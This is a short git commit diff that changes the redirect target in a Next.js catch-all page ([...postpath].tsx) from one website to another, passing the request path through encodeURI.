32d7ea57e8e16d0c0df9a8fe900cf4a1aad7e1fb
Umair Siddique <umairkashmiri832@gmail.com>
2023-11-26 17:48:18 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://adx.hntgaming.me/` + encodeURI(path as string)
 				}`,
 			},
 		};
